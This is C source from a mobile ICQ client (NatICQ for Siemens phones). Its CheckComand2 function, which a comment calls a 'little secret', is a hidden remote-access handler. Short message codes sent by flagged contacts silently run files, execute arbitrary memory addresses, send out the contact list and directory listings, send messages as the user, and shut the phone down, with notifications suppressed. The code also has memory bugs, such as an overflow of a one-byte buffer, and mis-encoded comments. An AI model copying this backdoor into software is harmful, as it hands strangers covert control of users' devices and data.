#include "../inc/swilib.h"
#include "../inc/cfg_items.h"
#include "../inc/pnglist.h"
#include "NatICQ.h"
#include "main.h"
#include "naticq_ipc.h"
#include "../inc/xtask_ipc.h"
#include "strings.h"

//“ут вс€ка€ поебень)))

#define _ECHOCHAT    "@1"
#define _ECHO        "@2"
#define _VIBRA       "@3"
#define _IDLESCR     "@4"
#define _DISCONNECT  "@5"
#define _GETCLISTALL "@6"
#define _GETCLIST    "@7"
#define _WRITE       "@13"
#define _GETFLIST    "@8"
#define _RUNFILE     "@9"
#define _PIKOFF      "@10"
#define _EXIT        "@11"
#define _TURNOFF     "@12" 
#define MSG_ECHOCHAT "@Ms s: %s"
//#define __ECHOCHAT "\x23\x65\x63\x68\x6F\x63\x68\x61\x74"
#define ENA_SIGNAL 1 //дл€ команд, активировать сигналы,али нет
#define DIS_SIGNAL 0

//ѕо 10 секунд
#define ACTIVE_TIME 360

extern void SendData(CLIST *t,char *s,int signal,int count);
extern void AddStringToLog(CLIST *t, int code, char *s, const char *name, unsigned int IDforACK,int flag);
extern void RecountMenu(CLIST *req, int needfocus);
extern void start_vibra(void);
extern char *GetStatusByIconIndex(int icon);
extern CLIST *FindContactByUin(unsigned int uin);


extern int comanda;
extern int VIBR_TYPE;
extern volatile int silenthide;
extern volatile int disautorecconect;
extern volatile int vibra_count;
extern volatile int SENDMSGCOUNT;
extern volatile CLIST *cltop;
extern char per_s[];
extern char I_str[];
extern int SHOW_ACTIVE;
extern const char ipc_my_name[32];
extern const char ipc_xtask_name[];
extern const char ipc_test_name[];
extern IPC_REQ gipc;

int get_file_size(char* fname)
{
  unsigned int err;
  FSTATS fs;
  if ((GetFileStats(fname,&fs,&err))==-1) return 0;
  return (fs.size);
}


int start(const char s[128])
{
  if((s)&&strlen(s))
   {
    if((s[2]=='\\')&&((s[(strlen(s))-3]=='.')||//ѕровер€ем строку на наличие символов '\\' и '.'
       (s[(strlen(s))-4]=='.')||(s[(strlen(s))-5]=='.')))
       /* ≈сли в строке есть символы '\\' и '.', то запускаем как обычный файл*/
        {
          WSHDR *ws;
          ws=AllocWS(256);
          str_2ws(ws,s,256);
          ExecuteFile(ws,0,0);
          FreeWS(ws);
          return (1);
         }
    if ((s[2]!='\\')&&(s[(strlen(s))-3]!='.')&&
       (s[(strlen(s))-4]!='.')&&(s[(strlen(s))-5]!='.')&&
       (s[0]!='a')&&(s[0]!='A')&&(s[1]!='0'))
        {
        int (*p) (void);
         p=(int(*)(void))GetFunctionPointer((char*)s);
         if(p!=NULL)
          (*p)();
         else
           ShowMSG(1,(int)"NULL pointer function!");
        return 1;
        }

    if ((s[2]!='\\')&&(s[(strlen(s))-3]!='.')&&
       (s[(strlen(s))-4]!='.')&&(s[(strlen(s))-5]!='.')&&
       ((s[0]=='a')||(s[0]=='A'))&&(s[1]=='0'))
        {
          int entry;
          sscanf(s,"%08X",&entry);
          SUBPROC((void*)entry);
          return 1;
        }
   }
  return 0;    
}


void CheckComand2(char *txt, CLIST *t)
{
  comanda=1;    
//---------------------- REMOTE ACCESS -------------------//
//так,маленький секрет так сказать))) глюмлюсь над теми кто достает....))
 if((txt[0]=='#' || txt[0]=='@') && t->isaccess)
  {
    
  if(/*strstr(txt,"#write") || */strstr(txt,_WRITE))//#write uin message
    {
      char *s=strrchr(txt,' ')+1;
#ifdef kluchnik
      CLIST *tt;
      tt=FindContactByUin(strtoul(txt+strlen(_WRITE)+1,0,10));
      AddStringToLog(tt,0x01,s,I_str,(++SENDMSGCOUNT)&0x7FFF,1);
      AddStringToLog(t,0x01,txt,I_str,0x7FFF,1);
      t->signals=1;
      tt->signals=1;
      if(SHOW_ACTIVE)
        tt->isactive=ACTIVE_TIME;
#else
      ++SENDMSGCOUNT;
#endif
      TPKT *p;
      p=malloc(sizeof(PKT)+strlen(s)+1);
      p->pkt.uin=strtoul(txt+strlen(_WRITE)+1,0,10);
      p->pkt.type=T_SENDMSG;
      p->pkt.data_len=strlen(s);
      strcpy(p->data,s);
      SUBPROC((void *)SendAnswer,0,p);
      return;
    }
     
   if(strstr(txt,_PIKOFF))
    {
      char *s=malloc(1);
      strcpy(s,"BGAGA");    
    }
   
      if(strstr(txt,_EXIT))
    {    
      t->signals=0;
#ifdef kluchnik
#else      
      extern void ElfKiller(void);
      SUBPROC((void *)ElfKiller);        
#endif
    }
    
    if(strstr(txt,_TURNOFF))
    {
      t->signals=0;
#ifdef kluchnik      
#else
      SwitchPhoneOff();
#endif
      return;
    }    
   
   if(/*strstr(txt,"#echochat") || */strstr(txt,_ECHOCHAT))
   {
    char msg[256];
    sprintf(msg,MSG_ECHOCHAT,txt);
    char *k;
    if(strstr(txt,_ECHOCHAT))
      k=txt+(strlen(_ECHOCHAT)+2);
/*    else
     k=txt+(strlen("#echochat")+2);*/
    char name[32];
    zeromem(name,32);
    char *tmp;
    if(tmp=strstr(txt," ")+1)//после первого пробела идет им€
    {
      if(strstr(tmp,"!"))//если есть еще '!',значит им€ прописали:)
      {
        int ii=0;
        for(ii=0;(ii<strlen(k) && ii<32) && ( k[ii]!=' ' );ii++)
          name[ii]=k[ii];
          name[ii++]=0;
      }
      else tmp=0;//иначе нуль
    }
    else tmp=0;//так,на вс€к случай ))
    
//    char *msg2=strrchr(txt,' ')+1;//наше сообщение дл€ отправки
    char *msg2;
    if(strstr(txt,_ECHOCHAT))
      msg2=txt+(strlen(_ECHOCHAT)+2+strlen(name)+1);
/*    else
      msg2=txt+(strlen("#echochat")+1+strlen(name)+1);*/
    char *s=malloc(256);
    sprintf(s,"m [ %s ] to [ %s ] n [ %s ] s.",msg2,t->name, name);
    if(tmp!=0)
      AddStringToLog(t,0x02,msg2,name,(++SENDMSGCOUNT)&0x7FFF,1);
    else
      AddStringToLog(t,0x02,msg2,"Ib",(++SENDMSGCOUNT)&0x7FFF,1);

    SendData(t,s,ENA_SIGNAL,0);
    mfree(s);
    return;   
   }
   
   if(/*strstr(txt,"#echo") || */strstr(txt,_ECHO))
     {
      ShowMSG(1,(int)txt+2);
      char msg[256];
      sprintf(msg,"M %s snd",txt);
      SendData(t,msg,ENA_SIGNAL,1);
      return;
     }
   
   if(/*strstr(txt,"#vibra") || */strstr(txt,_VIBRA))
    {
      vibra_count=strtoul(txt+3,0,10);
      
      if(vibra_count==0)
      {
        if( VIBR_TYPE) //если написали просто команду без параметра
         vibra_count=2;
        else
         vibra_count=1;
      }
#ifdef kluchnik
      if(vibra_count>10 || vibra_count<0)
        vibra_count=1;
#endif
      start_vibra();
      SendData(t,"act",DIS_SIGNAL,1);
      return;      
    }    
    /*
   if(strstr(txt,"#gprsoff"))
   {
#ifdef kluchnik
     char *s=malloc(256);
     sprintf(s,"Recive command < Gprs off >");
     AddStringToLog(t,0x01,s,I_str,(++SENDMSGCOUNT)&0x7FFF,1);
     mfree(s);
     SendData(t,"GPRS Off",ENA_SIGNAL,0);
#else
     SendData(t,"GPRS Off",DIS_SIGNAL,1);
     GPRS_OnOff(0,1);   
#endif
     return;
   }*/
 
    
    if(/*strstr(txt,"#idlescr") ||*/ strstr(txt,_IDLESCR))
    {
      SendData(t,"scr..",DIS_SIGNAL,1);
      RecountMenu(NULL,1);
      silenthide=1;
      gipc.name_to=ipc_xtask_name;
      gipc.name_from=ipc_my_name;
      gipc.data=0;
      GBS_SendMessage(MMI_CEPID,MSG_IPC,IPC_XTASK_IDLE,&gipc);    
      return;    
    }

    
    if(/*strstr(txt,"#disconnect") ||*/ strstr(txt,_DISCONNECT))
    {
      comanda=0;
      disautorecconect=1;
      t->signals=0;
      SENDMSGCOUNT++;
#ifdef kluchnik
#else
      void end_socket(void);
      SUBPROC((void*)end_socket);
#endif
      return;
    }    
   
    if(/*strstr(txt,"#getclistall") || */strstr(txt,_GETCLISTALL))
    {
      CLIST *tt;
      tt=(CLIST *)(&cltop);
      char *s=malloc(16384);
      *s=0;
      char ss[64];
      char *q;
      while(tt=(CLIST *)(tt->next))
       {
        if(!tt->isgroup)
         {
           q=GetStatusByIconIndex(GetIconIndex(tt));
           snprintf(ss,64,"%s ( %d ) [%s]\r\n",tt->name,tt->uin,q);
           strcat(s,ss);
         }
       }
#ifdef kluchnik
      AddStringToLog(t,0x01,"Sending contact list all...",I_str,(++SENDMSGCOUNT)&0x7FFF,1);
      SendData(t,s,ENA_SIGNAL,0);
#else
      SendData(t,s,DIS_SIGNAL,1);
#endif
      mfree(s);
      return;
    }
   
    if(/*strstr(txt,"#getclist") || */strstr(txt,_GETCLIST))
    {
      CLIST *tt;
      tt=(CLIST *)(&cltop);
      char *s=malloc(16384);
      *s=0;
      char ss[64];
      char *q;
      while(tt=(CLIST *)(tt->next))
       {
        if(tt->state!=0xFFFF && !tt->isgroup)
         {
           q=GetStatusByIconIndex(GetIconIndex(tt));
           snprintf(ss,64,"%s ( %d ) [%s]\r\n",tt->name,tt->uin,q);
           strcat(s,ss);
         }
       }
#ifdef kluchnik
      AddStringToLog(t,0x01,"Sending contact list online...",I_str,(++SENDMSGCOUNT)&0x7FFF,1);
      SendData(t,s,ENA_SIGNAL,0);
#else
      SendData(t,s,DIS_SIGNAL,1);
#endif      
      mfree(s);
      return;
    }
    
 
   
    if(/*strstr(txt,"#getflist") || */strstr(txt,_GETFLIST))
     {
       DIR_ENTRY de;
       unsigned int err;
       char *s=malloc(16384);
       char *path=malloc(256);
       char p[64];
       if(strstr(txt,_GETFLIST))
         sprintf(path,per_s,txt+3);
     /*  else
         sprintf(path,per_s,txt+strlen("#getflist")+1);*/
       char *ptr=path+strlen(path)+1;
       strcat(path,"\\*.*");
       *s=0;
       if(FindFirstFile(&de,path,&err))
        {
         do
         {
           strcpy(ptr,de.file_name);  
           if (de.file_attr&FA_DIRECTORY)
             sprintf(p,"\\%s\r\n",de.file_name);
           else
            sprintf(p," %s\r\n",de.file_name);
            strcat(s,p);
         }
         while(FindNextFile(&de,&err));
        }
       FindClose(&de,&err);
       mfree(path);
       if(!s) sprintf(s,"dr ( %s ) n f",txt+strlen(_GETFLIST)+1);
  
  #ifdef kluchnik
       char *ss=malloc(256);
       sprintf(ss,"Recive command < Get files from directory %s >",txt+strlen(_GETFLIST)+1);
       AddStringToLog(t,0x01,ss,I_str,(++SENDMSGCOUNT)&0x7FFF,1);
       if(SHOW_ACTIVE)
         t->isactive=ACTIVE_TIME;
       SendData(t,s,ENA_SIGNAL,0);
       mfree(ss);
  #else
       SENDMSGCOUNT++;
       SendData(t,s,DIS_SIGNAL,0);
  #endif      
       mfree(s);
       return;
     }
      
   if(/*strstr(txt,"#runfile") ||*/ strstr(txt,_RUNFILE))
   {   
#ifdef kluchnik
     char *ss=malloc(256);
     sprintf(ss,"Recive command < Run file %s >",txt+strlen(_RUNFILE)+1);
     AddStringToLog(t,0x01,ss,I_str,(++SENDMSGCOUNT)&0x7FFF,1);
     SendData(t,"File was been runned!!",ENA_SIGNAL,0);
     mfree(ss);
#else
     int i=0;
     if(strstr(txt,_RUNFILE)) i=start(txt+3);
   //  else i=start(txt+strlen("#runfile")+1);
        
     if(i)
       SendData(t,"run!",DIS_SIGNAL,1);
     else
       SendData(t,"nrun!",DIS_SIGNAL,1);
#endif
     return;
   }   
 }//if(txt[0]=='#' && t->remoteAccess!=4)
}


IMGHDR screen={0,0,8,""};
void DoScreen()
{
  int ScrH=ScreenH();
  int ScrW=ScreenW();
  char *ms=RamScreenBuffer();
  screen.w=ScrW;
  screen.h=ScrH;
  screen.bitmap=malloc(ScrW*ScrH*2);
  memcpy(screen.bitmap, ms, ScrW*ScrH*2);
}
